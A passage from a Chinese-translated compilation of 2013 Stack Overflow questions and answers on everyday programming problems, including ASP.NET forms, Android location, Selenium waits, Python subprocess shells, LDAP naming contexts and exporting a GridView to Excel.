        <div class="editor-field">
            @Html.TextBoxFor(model => model.FirstName, new { maxlength = 50 })
            @Html.ValidationMessageFor(model => model.FirstName)
        </div>
        <div class="editor-label">
            Last name :
        </div>
        <div class="editor-field">
            @Html.TextBoxFor(model => model.LastName, new { maxlength = 50 })
            @Html.ValidationMessageFor(model => model.LastName)
        </div>
        <div class="editor-label">
            National number :
        </div>
        <div class="editor-field">
            @Html.EditorFor(model => model.NumNat, new { maxlength = 11 })
            @Html.ValidationMessageFor(model => model.NumNat)
        </div>
        <div class="editor-label">
            Start date :
        </div>
        <div class="editor-field">
            @Html.TextBoxFor(model => model.StartDate, new { @class = "datepicker", @Value = Model.StartDate.ToString("yyyy/MM/dd") })
            @Html.ValidationMessageFor(model => model.StartDate)
        </div>
        <div class="editor-label">
            End date :
        </div>
        <div class="editor-field">
            @if (Model.EndDate.HasValue)
            {
                @Html.TextBoxFor(model => model.EndDate, new { @class = "datepicker", @Value = Model.EndDate.Value.ToString("yyyy/MM/dd") })
                @Html.ValidationMessageFor(model => model.EndDate)
            }
            else
            {
                @Html.TextBoxFor(model => model.EndDate, new { @class = "datepicker" })
                @Html.ValidationMessageFor(model => model.EndDate)
            }
        </div>
        <div class="editor-label">
            Distance House - Work (km) :
        </div>
        <div class="editor-field">
            @Html.EditorFor(model => model.HouseToWorkKilometers)
            @Html.ValidationMessageFor(model => model.HouseToWorkKilometers)
        </div>
        <div class="editor-label">
            Category :
        </div>
        <div class="editor-field">
            @Html.DropDownList("Id_ProductPackageCategory", "Choose one ...")
            @Html.ValidationMessageFor(model => model.Id_ProductPackageCategory) <a href="../ProductPackageCategory/Create">
                Add a new category?</a>
        </div>
        <div class="editor-label">
            Upgrade? :
        </div>
        <div class="editor-field">
            @Html.EditorFor(model => model.Upgrade)
            @Html.ValidationMessageFor(model => model.Upgrade)
        </div>
    </div>
    <div class="modal-footer">
        <button class="btn btn-inverse" type="submit">Save</button>
    </div>
} 
```

知道发生了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:51:52.717

先试试这个，在局部视图的上方`@Html.ValidationSummary()`，你有模态的头部、身体和页脚，放置：

```
@Html.HiddenFor(model => model.PersonId) // or.Id whatever's in your model 
```

这会在您的视图中创建一个隐藏字段并设置模型 ID，即 PK。

# android - 网络位置提供商不提供位置 android

> ID：16013601
> 
> 赞同：2
> 
> 时间：2013-04-15T11:06:31.873
> 
> 标签：android, geolocation, location-provider

我正在开发一个小型 android 应用程序，我想在其中使用网络提供商找出用户的当前位置。我通过以下方式尝试了这个，但它没有给我任何输出：

```
networklocationManager = (LocationManager) this
        .getSystemService(Context.LOCATION_SERVICE);
// Define a listener that responds to location updates
LocationListener networklocationListener = new LocationListener() {

    public void onLocationChanged(Location location) {
        Log.i("********************************",
                "this is my network location " + location);
        String Location_text = "NETWORK LOCATION latitude:"
                + location.getLatitude() + " longitude:"
                + location.getLatitude();
        network_location.setText(Location_text);
    }

    public void onStatusChanged(String provider, int status,
            Bundle extras) {}

    public void onProviderEnabled(String provider) {}

    public void onProviderDisabled(String provider) {}
};
// Register the listener with the Location Manager to receive location
// updates
networklocationManager
        .requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0,
                networklocationListener); 
```

我像这样在我的清单文件中授予权限

```
 <uses-permission 
    android:name="android.permission.INTERNET" />
<uses-permission
    android:name="android.permission.ACCESS_COARSE_LOCATION" />
 <uses-permission
    android:name="android.permission.ACCESS_FINE_LOCATION" /> 
```

有什么我想念的吗？这是正确的方法吗？需要帮忙。谢谢...

* * *

```
public class MainActivity extends Activity implements LocationListener {

    private TextView latituteField;
    private TextView longitudeField;
    private LocationManager gpslocationManager;
    private LocationManager networklocationManager;
    private LocationManager networklocationManager1;
    private String provider;
    private TextView gps_location;
    private TextView network_location;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        gps_location = (TextView) findViewById(R.id.gps_location);
        network_location = (TextView) findViewById(R.id.network_location);
        networkLocation();
    }

    public void networkLocation() {
        networklocationManager = (LocationManager) this
                .getSystemService(Context.LOCATION_SERVICE);
        LocationListener networklocationListener = new LocationListener() {

            public void onLocationChanged(Location location) {
                Log.i("********************************",
                        "this is my network location " + location);
                String Location_text = "NETWORK LOCATION latitude:"
                        + location.getLatitude() + " longitude:"
                        + location.getLatitude();
                network_location.setText(Location_text);
            }

            public void onStatusChanged(String provider, int status,
                    Bundle extras) {}

            public void onProviderEnabled(String provider) {}

            public void onProviderDisabled(String provider) {}
        };
        networklocationManager
                .requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0,
                        networklocationListener);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:23:37.537

确保在设置中启用定位服务！那应该是问题所在。它可能被禁用（并且此设置通常可以在设置中的位置和安全中找到）

让我知道它是否有效！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-13T19:17:52.290

您的网络提供商是否已启用？

```
boolean network_enabled;
try {
    network_enabled = locManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
} catch(Exception ex) {
   ex.printStackTrace();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:25:21.757

我希望这部分代码能帮助你从[vogella](http://www.vogella.com/articles/AndroidLocationAPI/article.html)中提取出来。

```
public class ShowLocationActivity extends Activity implements LocationListener {

    private TextView latituteField;
    private TextView longitudeField;
    private LocationManager locationManager;
    private String provider;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        latituteField = (TextView) findViewById(R.id.TextView02);
        longitudeField = (TextView) findViewById(R.id.TextView04);
        // Get the location manager
        locationManager = (LocationManager) 
                getSystemService(Context.LOCATION_SERVICE);
        // Define the criteria how to select the locatioin provider -> use
        // default
        Criteria criteria = new Criteria();
        provider = locationManager.getBestProvider(criteria, false);
        Location location = locationManager.getLastKnownLocation(provider);
        // Initialize the location fields
        if (location != null) {
            System.out.println("Provider " + provider + " has been selected.");
            onLocationChanged(location);
        } else {
            latituteField.setText("Location not available");
            longitudeField.setText("Location not available");
        }
    }

    /* Request updates at startup */
    @Override
    protected void onResume() {
        super.onResume();
        locationManager.requestLocationUpdates(provider, 400, 1, this);
    }

    /* Remove the locationlistener updates when Activity is paused */
    @Override
    protected void onPause() {
        super.onPause();
        locationManager.removeUpdates(this);
    }

    @Override
    public void onLocationChanged(Location location) {
        int lat = (int) (location.getLatitude());
        int lng = (int) (location.getLongitude());
        latituteField.setText(String.valueOf(lat));
        longitudeField.setText(String.valueOf(lng));
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {}

    @Override
    public void onProviderEnabled(String provider) {
        Toast.makeText(this, "Enabled new provider " + provider,
            Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onProviderDisabled(String provider) {
        Toast.makeText(this, "Disabled provider " + provider,
            Toast.LENGTH_SHORT).show();
    }
} 
```

# algorithm - 使用 CUDA 实现 AES 算法

> ID：16013602
> 
> 赞同：2
> 
> 时间：2013-04-15T11:06:35.257
> 
> 标签：algorithm, cuda, aes

AES算法最重要的问题是速度慢。

是否可以使用 CUDA 实现其算法？我知道这是可能的，但我知道我能提高多少速度？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T11:25:15.953

对的，这是可能的。根据[这篇文章](http://ieeexplore.ieee.org/xpls/abs_all.jsp?arnumber=5695236)，加速可能非常显着。

> 与 Core i7-920 2.66GHz CPU 实现相比，最佳 GPU 实现实现 35.2Gbps 吞吐量和 28.39 倍速度的性能差异超过 10 倍。

还有一个带有一些[有趣基准](http://code.google.com/p/engine-cuda/wiki/benchmarkVersion011)的开源实现。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T11:27:46.260

您可能会发现这些参考资料很有用：

*   [AES 与 CUDA AES](http://www.youtube.com/watch?v=BVO97kXuiro) - 该视频显示了两者之间的显着差异。

*   [第 36 章 GPU 上的 AES 加密和解密](http://http.developer.nvidia.com/GPUGems3/gpugems3_ch36.html)

# android - 如何在画布中为 Android 游戏应用程序添加背景图像

> ID：16013605
> 
> 赞同：0
> 
> 时间：2013-04-15T11:06:40.513
> 
> 标签：android, image, animation, canvas

为了学习导弹安卓游戏应用程序的功能，我想对它做一些修改，所以开始编辑背景变化，我用谷歌搜索并将代码放在画布中，

```
 Bitmap background = Bitmap.createBitmap( 0, 0, Bitmap.Config.ARGB_4444);
    Canvas canvas = new Canvas(background);

     c.drawBitmap(background, 10, 010, null); 
```

我尝试了很多东西，但没有任何结果，而且在上面的代码中也没有给出可绘制的路径，我应该在哪里给出图像的路径？任何帮助请..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:15:03.190

希望这段代码能给你一些关于这个的线索......

```
//Here you can decode it from any source like SD card as i shown,Resources or from assets
    Bitmap mBitmapFromSdcard = BitmapFactory.decodeFile("/mnt/sdcard/download/tux.png");
    Canvas mCanvas = canvas;
            if (mBitmapFromSdcard != null) {
                mCanvas.drawBitmap(mBitmapFromSdcard, 0, 0, null);
            } 
```

# c# - 页面对象模型中的显式等待

> ID：16013612
> 
> 赞同：1
> 
> 时间：2013-04-15T11:06:50.153
> 
> 标签：c#, webdriver, selenium-webdriver

我正在尝试使用页面对象模型中的显式等待来测试单个页面应用程序，我面临的问题是显式等待在调用页面后立即开始检查元素，因为页面完全动态仅某些元素一些动作后出现。由于元素甚至在创建之前就被检查过，所以它总是会出现错误“没有这样的元素异常”示例代码：

```
 public class example
    {

    private IWebElement ExampleElement = wait.Until<IWebElement>((d) =>
                {
                    return d.FindElement(By.Id("ExampleElement ID"));
                });
private IWebElement ExampleElement2 = wait.Until<IWebElement>((d) =>
                {
                    return d.FindElement(By.Id("ExampleElement ID"));
                });

    public void example1()
    {
    ExampleElement.click();
    ExampleElement2.click();
    }
    } 

    public class exampleTest
    {
    [Test]
    public void SomeTest()
    {
    example.example1();
    }
    } 
```

ExampleElement2 仅在 ExampleElement 单击后加载，但发生的情况是它甚至在单击操作之前一直检查 ExampleElement2，因此它无法找到它并给出异常。问题是我不希望元素在它被调用之前检查是否存在。

我是全新的，提前谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T15:21:11.543

看来您在这里遇到了模式问题。您的 WebElements 处于类级别，因此当启动类的实例时，webdriver 正在尝试初始化所有内容，因此甚至等待 Element2。如果 Element2 是动态的，那么您不能在班级级别等待它。在您期望它出现的情况之后等待它。

我想说只是在课堂上，

```
private IWebElement ExampleElement2; 
```

然后，做

```
 public void example1()
    {
    ExampleElement.click();
    ExampleElement2 = wait.Until<IWebElement>((d) =>
                {
                    return d.FindElement(By.Id("ExampleElement ID"));
                });
    ExampleElement2.click();
    } 
```

你也可能想看看[PageFactory](https://code.google.com/p/selenium/wiki/PageFactory)。您不想在您的代码中重复 driver.findElement 和其他明显的优势，这些优势不在这个主题:-)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T19:09:13.450

正如 nilesh 在他的回答中提到的那样，需要推迟加载`ExampleElement2`. 但是，它应该是一个显式等待，您需要等待相关的预期条件，例如您可以说等到`ElementIsVisible`（在 Java API 中，您可以`elementToBeClickable`根据元素类型放置特定条件）。然后它确保元素满足您通过的特定条件。

PS - 很抱歉，我无法通过代码片段帮助您。因为我是一个 Java 人，所以我没有使用 C# 做过任何 Selenium 测试。但原理是一样的。

# javascript - 谷歌地图 - 在路径中存储应用程序定义的数据

> ID：16013614
> 
> 赞同：0
> 
> 时间：2013-04-15T11:06:54.317
> 
> 标签：javascript, google-maps-api-3

在我的应用程序中，我想将应用程序定义的数据存储在路径中的每个 latLng 上。我已经使用下面的代码示例让它工作，但我想知道这是否是一个无证的侥幸，只是“发生”工作并且将来可能会被破坏，或者它是完全有效的代码，应该总是工作？简而言之，'getPath' 是否保证返回传入的相同 latLng 对象，或者它是否可以传回具有相同 lat 和相同 lng 的新对象，但谷歌不关心的其他任何东西可能不存在？

感谢您的帮助

单击该行，它应该会提示“一二三”。

```
<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
    <style type="text/css">
      html { height: 100% }
      body { height: 100%; margin: 0; padding: 0 }
      #map-canvas { height: 100% }
    </style>
    <script type="text/javascript"
      src="https://maps.googleapis.com/maps/api/js?key=MY_KEY&sensor=false">
    </script>
    <script type="text/javascript">
      function initialize() {
        var mapOptions = {
          center: new google.maps.LatLng(52.0, -1.5),
          zoom: 10,
          mapTypeId: google.maps.MapTypeId.ROADMAP
        };
        var map = new google.maps.Map(document.getElementById("map-canvas"),
            mapOptions);

        var polyline = new google.maps.Polyline({
            map: map,
            strokeColor: "blue",
            strokeThicknedss: 2
        });

        polyline.setPath([
            getLatLng(51.9, -1.4, "one"),
            getLatLng(52.0, -1.5, "two"),
            getLatLng(52.0, -1.6, "three")
        ]);

        google.maps.event.addListener(polyline, "click", function() {
            var path = this.getPath().getArray();
            var datas = [];
            for(var i = 0; i < path.length; i++) {
                var ll = path[i];
                datas.push(ll.data);
            }
            alert(datas.join("\n"));
        });
      }

      function getLatLng(lat, lng, data) {
        var ll = new google.maps.LatLng(lat, lng);
        ll.data = data;
        return ll;
      }

      google.maps.event.addDomListener(window, 'load', initialize);
    </script>
  </head>
  <body>
    <div id="map-canvas"/>
  </body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T12:36:30.973

那么[根据文档](https://developers.google.com/maps/documentation/javascript/reference#Polyline)getPath() '*检索第一个路径*'。而且您刚刚使用 setPath() 设置了路径...我不确定 Google 是否会弄乱该数据；你的方法对我来说似乎是合理的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T13:22:38.227

我发现存储折线的最佳方式是使用几何库中谷歌的编码功能。

```
var polylineToStore = google.maps.geometry.encoding.encodePath(polyline.getPath()); 
```

这会将 polylineToStore 变量设置为字符串。当您想重用该编码折线时，您只需要对其进行解码：

```
polyline.setPath(google.maps.geometry.encoding.decodePath(polylineToStore)) 
```

[https://developers.google.com/maps/documentation/javascript/geometry#Encoding](https://developers.google.com/maps/documentation/javascript/geometry#Encoding)

# python - os.system 抱怨圆括号

> ID：16013616
> 
> 赞同：2
> 
> 时间：2013-04-15T11:06:55.057
> 
> 标签：python, awk, paste, os.system

我正在尝试将这一行包含在 python 脚本中。

```
!#/bin/bash/env python

import os

os.system("paste <(awk '!/^($|[:space:]*#)/{print $0}' file1) <(awk '!/^($|[:space:]*#)/{print $0} file2) > out_file") 
```

直接从 bash 运行时，该命令非常好。但是，在脚本中，我得到：

```
sh: -c: line0: syntax error near unexpected token `(' 
```

简单使用时问题仍然存在：

```
os.system("paste <(cat file1) > output_file") 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T11:10:53.577

> 直接从 bash 运行时，该命令非常好。但是，在脚本中，我得到：

```
sh: -c: line0: syntax error near unexpected token `(' 
```

那是因为在脚本内部，您使用`sh`而不是运行命令`bash`。此命令和更简单的命令都使用`bash`- 特定功能。尝试运行一个`sh`shell 并输入相同的行，你会得到同样的错误。

[os.system](http://docs.python.org/2/library/os.html#os.system)调用没有记录它使用的 shell，因为它是：

> 通过调用标准 C 函数实现`system()`

在大多数类 Unix 系统上，这调用`sh`. 你可能不应该依赖它......但你*绝对*不应该依赖它调用`bash`！

如果要运行`bash`命令，请使用[`subprocess`](http://docs.python.org/2/library/subprocess.html#subprocess.call)模块并`bash`显式运行：

```
subprocess.call(['bash', '-c', 'paste <(cat file1) > output_file']) 
```

我想，你可以尝试让引用权`bash`作为 shell`system`使用中的子 shell 运行……但为什么要麻烦呢？

这是文档反复告诉您应该考虑使用`subprocess`而不是`os.system`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:35:53.623

`awk`用一个脚本杀死两只鸟：

```
awk -v DELIM=' ' '!/^($|[[:space:]]*#)/{a[FNR]=a[FNR]DELIM$0}END{for(i=1;i<=FNR;i++)print substr(a[i],2)}' file1 file2 
```

这消除了对过程替换的需要，因此是`sh`合规的。

# iphone - 拍摄多张图像时 iPhone 崩溃并且速度变慢

> ID：16013617
> 
> 赞同：0
> 
> 时间：2013-04-15T11:06:57.943
> 
> 标签：iphone, ios, uiimagepickercontroller

我正在开发一个应用程序，我需要在其中捕获多个图像并将它们存储在一个文件夹中。当图像超过时，应用程序崩溃。另外，在拍摄图像时，iPhone 速度会变慢一点。请任何人都可以帮助我。

捕获图像的代码

```
UIImagePickerController *picker=[[UIImagePickerController alloc]init];
picker.delegate=self;   
picker.sourceType=UIImagePickerControllerSourceTypeCamera;

[self.navigationController presentModalViewController:picker animated:YES]; 
```

将图像添加到文件中的代码

```
NSString  *pngImagePath =
[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
NSUserDomainMask, YES) lastObject]
stringByAppendingPathComponent:[NSString
stringWithFormat:@"%@.png",imageName]];

    [dataImage writeToFile:pngImagePath atomically:YES]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:27:29.023

只需尝试一次@autoreleasepool，可能是由于一些内存泄漏。@autoreleasepool 在某种程度上保持..

```
 @autoreleasepool
    {
      // any allocation for UIImage if u have just bring inside the autoreleasepool
        NSString  *pngImagePath =
        [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
        NSUserDomainMask, YES) lastObject]
        stringByAppendingPathComponent:[NSString
        stringWithFormat:@"%@.png",imageName]];
        [dataImage writeToFile:pngImagePath atomically:YES];
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:14:13.903

在这里，以这段代码为例，在将图像显示在屏幕上之前调整它们的大小：

```
+ (UIImage*)imageWithImage:(UIImage*)image
          scaledToSize:(CGSize)newSize;
{
    UIGraphicsBeginImageContext( newSize );
    [image drawInRect:CGRectMake(0,0,newSize.width,newSize.height)];
    UIImage* newImage = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    return newImage;
} 
```

请注意，在将图像保存到磁盘之前，您还应该缩小图像：

```
UIImage *image = YOUR_IMAGE;
NSData *imageData = UIImageJPEGRepresentation(image, .06); // Here's the level of compression 
```

# java - 如何在 LDAP 中将域名转换为专有名称 (DN)？

> ID：16013624
> 
> 赞同：1
> 
> 时间：2013-04-15T11:07:24.913
> 
> 标签：java, ldap, distinguishedname, opendj

我正在创建一个能够使用 OpenDJ Client SDK 登录到 LDAP 服务器的 Java 应用程序，但我只有**Domain Name**、**User Name**（也称为 SAMAccountName ）和**Password**。如果您不知道域登录，请参阅此图像：

![在此处输入图像描述](https://i.stack.imgur.com/IYPyh.png)

您以以下格式输入用户名字段：DOMAIN_NAME\USER_NAME 而不是简单的 USER_NAME。域名示例为：corp.fabrikam.com。

现在我需要知道如何将域名转换为专有名称 (DN)？因为 OpenDJ 需要专有名称才能连接到 LDAP。

例如：corp.fabrikam.com 的专有名称是：dc=corp、dc=fabrikam、dc=com。

看来我只需要用“。”拆分它，但我听说有一个叫做不相交域的东西：
[http ://technet.microsoft.com/en-us/library/cc731125%28v=ws.10%29.aspx](http://technet.microsoft.com/en-us/library/cc731125%28v=ws.10%29.aspx)

所以这里的分裂技巧可能不可靠。

此外，LDAP 中的用户可以在**组织单位 (OU)**下。假设用户**john**属于**经理**OU，因此 john 的完整用户 DN 将如下所示：

uid=john，ou=manager，dc=corp，dc=fabrikam，dc=com

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T16:37:44.607

You should always refer to the RootDSE entry of the ldap server to get information about the environment you are connecting to. The RootDSE entry is readable by anyone upon an anonymous bind ( or a particular user, it does not really matter, as long as you are bound ). It contains a lot of interesting stuff, the one you are looking for is defaultNamingContext.

Once bound, perform an ldap read operation on the DN of an empty string: ''. If the framework of your choice provides some API to read the rootDSE, try to use that. It might be much more simple.

This might help you to get a kickstart: [http://opendj.forgerock.org/opendj-ldap-sdk/apidocs/index.html](http://opendj.forgerock.org/opendj-ldap-sdk/apidocs/index.html) I did not find any mention of the defaultNamingContext on the opendj documentation pages, but you might just get the information you are looking for via getNamingContexts() method.

Note that rootDSE is an ldap feature, it's not implementation-specific.

# javascript - 从 JSON 对象返回最大值

> ID：16013625
> 
> 赞同：7
> 
> 时间：2013-04-15T11:07:35.937
> 
> 标签：javascript, max

我有一个关联数组，如下所示：

```
var data = {
    0: {
        'Number_of_Something': 212
    },
    1: {
        'Number_of_Something': 65
    },
    2: {
        'Number_of_Something': 657
    }
} 
```

我需要提取字段中的最大值`Number_of_Something`，但是，因为它是对象的对象内的字段，所以它比仅遵循类似于[此处](https://stackoverflow.com/questions/1669190/javascript-min-max-array-values)概述的方法要复杂一些。

遍历对象并存储值，然后在下一个更大时替换它似乎是最简单和明显的选择。

**我只是在问这个问题，以防除了上述方法之外还有更简单（更智能）的方法来实现这一目标？**

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-15T11:18:31.000

*更简单可能是主观的......实现您所要求的另一种方法是使用*[Object.keys](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/keys)和[Array.prototype.map](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/map)获取值数组，并使用您链接的*Math.max*的其他解决方案：

```
var data = {
    0: {
        'Number_of_Something': 212
    },
    1: {
        'Number_of_Something': 65
    },
    2: {
        'Number_of_Something': 657
    }
}

var max = Math.max.apply(null,
                        Object.keys(data).map(function(e) {
                                return data[e]['Number_of_Something'];
                        })); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:10:03.513

您可以创建自己的 (for) 循环并以这种方式返回最大值。另一种选择是使用像[Underscore.js](http://underscorejs.org/)这样的库来为您处理此问题并保持您的代码可读性。

# ruby-on-rails - RoR 样式表布局视图链接。`:media => all` 是什么意思

> ID：16013627
> 
> 赞同：0
> 
> 时间：2013-04-15T11:07:37.863
> 
> 标签：ruby-on-rails, ruby-on-rails-3, model-view-controller, layout, view

我有：

```
<&= stylesheet_link_tag    "application", :media => "all" %> 
```

但我正在为我的应用程序中的某些视图添加（完全）替代布局，并带有单独的样式表。我想将现有布局仅链接到一些样式表，并添加其他样式表。我需要在这里改变什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:30:29.003

为此，您可以在视图/布局中创建类似于您`application.html.erb` 的新文件，例如我正在创建 `home.html.erb`。在其中链接您的所有样式表和 js 文件，最后只需将该布局名称添加到所需的控制器中`layout 'home'`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:11:00.250

您可以使用单独的清单文件并包含那些清单文件 [这个答案](https://stackoverflow.com/questions/7134034/using-rails-3-1-assets-pipeline-to-conditionally-use-certain-css)将帮助您如何做到这一点

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:33:34.447

它指定`application.css`在以所有媒体类型查看页面时应该加载您的页面。它是 CSS 属性，而不是 Rails 属性。

有关详细信息，请参阅[http://www.w3.org/TR/CSS2/media.html#media-sheets 。](http://www.w3.org/TR/CSS2/media.html#media-sheets)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-15T11:35:06.907

您可以为整个控制器或特定操作添加单独的布局

例如：

在您的控制器中：

```
layout :resolve_layout
 #controller code
 ...
def resolve_layout
    case action_name
    when "new", "create", "wait_conformation"
      "customer_layout"    
    else
      "producer_layout"
    end
end 
```

这里`customer_layout`&`producer_layout`是布局文件。

# php - Wordpress 通过 twitpic 分享推特

> ID：16013629
> 
> 赞同：0
> 
> 时间：2013-04-15T11:07:42.837
> 
> 标签：php, wordpress, twitter, share, twitpic

我的问题有点复杂。

我想将我的 wordpress 网站上的帖子中的特色图片分享到 twitter。

但有一点很重要。我想与 twitpic 分享一张图片，因为人们无需打开我的网站就可以在 Twitter 上看到这张图片。

我从 twitpic 获取 api，并使用此代码（[链接](https://github.com/stevecorona/php-twitpic)）

但 twitpic 或此代码无法接受上传 twitpic 并获取链接的 url。

```
$resp = $twitpic->upload(array('media'=>'$a2', 'message'=>'get_the_title()')); 
```

如果我写 $a2 = "ex.jpg" 它工作，如果我写 $a2 = " [http://www.ex.com/ex.jpg](http://www.ex.com/ex.jpg) " 不工作

然后我试试看；

```
 <?php
$a1 = $_SERVER['DOCUMENT_ROOT'];
// ex image remove 18 chr from begining http://*******.com/wp-content/uploads/2013/04/2012-10-17-23.48.34.jpg
$kisalt1 = $imageshare[0]; // wordpress featured image fxn ex: http://*******.com/wp-content/uploads/2013/04/2012-10-17-23.48.34.jpg
$kisalmis = substr($kisalt1,18,9999);
$a2 = $a1.$kisalmis;
// echo $a2;  =>  /home/*******/public_html/wp-content/uploads/2013/04/bu-terste-bir-islik-var-panpa.jpg
?> 
```

但它仍然给出同样的错误。

无法找到或读取文件

我怎么能搭上这个？

摘要 => 我想要这个 => wordpres 特色图片到 twitpic 以分享 twitter 之类的图片，无需点击链接即可打开。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T13:52:38.717

编辑：我刚刚尝试删除它，因为我看到您说[http://www.ex.com/ex.jpg](http://www.ex.com/ex.jpg)不适合您。但是后来我认为这可能仍然有帮助（对某人），并且由于某种原因，评论选项没有出现在我面前，所以又来了。对不起，如果它没有帮助。

* * *

您需要的只是 post_thumbnail 网址，而不是完整的图像标签。

[http://wordpress.org/support/topic/getting-post-thumbnail-url](http://wordpress.org/support/topic/getting-post-thumbnail-url)

相关帖子是带有此代码块的帖子：

```
$a2 = wp_get_attachment_url( get_post_thumbnail_id($post->ID) ); 
```

如果你添加它，它会起作用吗？

-安德鲁

* * *

另一个编辑...我刚刚在 Wordpress StackExchange 网站上看到了这篇文章：[https ://wordpress.stackexchange.com/questions/83137/post-thumbnail-relative-link-and-html-modify](https://wordpress.stackexchange.com/questions/83137/post-thumbnail-relative-link-and-html-modify)

如果您为 TwitPic 提供相对链接位置，它会起作用吗？

# javascript - 需要一些帮助来扩展 openerp JS“模块”

> ID：16013637
> 
> 赞同：1
> 
> 时间：2013-04-15T11:08:27.303
> 
> 标签：javascript, openerp

随着这种发展，我只想在 My TimeSheets 中显示四舍五入的数字。

实际上，我的 JS 文件已启动，但似乎`openerp.new_module`（见下文）从未被调用过。

```
openerp.new_module = function(instance){

    var module = instance.hr_timesheet_sheet // loading the namespace of the 'sample' module

    var _super_ = module.WeeklyTimesheet.prototype.sum_box;

    module.WeeklyTimesheet.include({

        sum_box : function(){
            //_super_.call(this);  // calling the original Foo.bar() method
            var line_total = 0;
            _.each(account.days[day_count].lines, function(line) {
                line_total += line.unit_amount;
            });
            return Math.round(line_total*100)/100;
        },

    });
}; 
```

提前非常感谢。

# .net - 自动化 .net Web 应用程序 使用负载均衡器部署在多台服务器上

> ID：16013638
> 
> 赞同：1
> 
> 时间：2013-04-15T11:08:26.937
> 
> 标签：.net, deployment, web, load-balancing, citrix

我想知道是否有办法在多台服务器上自动部署和发布 .net Web 应用程序。我们有一个 Citrix 负载平衡器，在部署时我应该禁用一些服务器并将部署包复制到禁用的服务器上，然后在蠕虫启动后启用它们并为其他服务器进行部署。是否有任何工具可以自动执行此过程？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-17T02:45:23.413

看看 Inedo 的 BuildMaster [（](http://inedo.com/BuildMaster)免责声明：我在那里工作）。实际上，我们有很多用户就是这样做的（例如[AllRecipes.com](http://inedo.com/buildmaster/case-studies/allrecipes)）——您可能完全可以使用免费版本的 BuildMaster 完成您想要做的事情。

# c# - 将gridview的选定列发送到excel文件

> ID：16013639
> 
> 赞同：1
> 
> 时间：2013-04-15T11:08:33.777
> 
> 标签：c#, excel, gridview

我尝试了将整个gridview数据保存到excel文件的代码，它工作正常，但现在我只想将gridview的特定列保存到excel文件中。我已经使用了mysql数据库和asp.net与C#。请任何人帮助我有了这个。

```
**default.aspx**
 <asp:GridView ID="GridView1" runat="server">
    </asp:GridView>

    <asp:Button ID="btnSave" runat="server" Text="Save to Excel" OnClick="btnSave_Click" />

**default.cs**
 protected void btnSave_Click(object sender, EventArgs e)
    {
        ExportGridToExcel(GridView1, "StudentMarks.xls");
    }

    public void ExportGridToExcel(GridView grdGridView, string fileName)
    {
        Response.Clear();
        Response.AddHeader("content-disposition", string.Format("attachment;filename={0}.xls", fileName));
        Response.Charset = "";
        Response.ContentType = "application/vnd.xls";
        StringWriter stringWrite = new StringWriter();
        HtmlTextWriter htmlWrite = new HtmlTextWriter(stringWrite);
        grdGridView.RenderControl(htmlWrite);
        Response.Write(stringWrite.ToString());
        Response.End();
    }

    public override void VerifyRenderingInServerForm(Control control)
    {
        return;
    } 
```

![这是我的网格视图](https://i.stack.imgur.com/6Ilay.png)

![这是生成的excel文件](https://i.stack.imgur.com/CqGzx.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:18:29.080

要生成excel，请使用此方法..

```
protected void btnExportExcel_Click(object sender, EventArgs e)
        {
            Response.Clear();

            Response.Buffer = true;
            Response.AddHeader("content-disposition","attachment;filename=GridViewExport.xls");
            Response.Charset = "";
            Response.ContentType = "application/vnd.ms-excel";

            StringWriter sw = new StringWriter();
            HtmlTextWriter hw = new HtmlTextWriter(sw);
            GridView.AllowPaging = false;

            // Re-Bind data to GridView 

            using (MSEntities1 CompObj = new MSEntities1())
            {
               // code for bind grid view 
                GridView.DataBind();
            }

            // Change the Header Row back to white color

            GridViewC.Style.Add(" font-size", "10px");

            GridView.HeaderRow.Style.Add("background-color", "#FFFFFF");

            //Apply style to Individual Cells

            GridView.HeaderRow.Cells[0].Style.Add("background-color", "green");
            GridView.HeaderRow.Cells[1].Style.Add("background-color", "green");
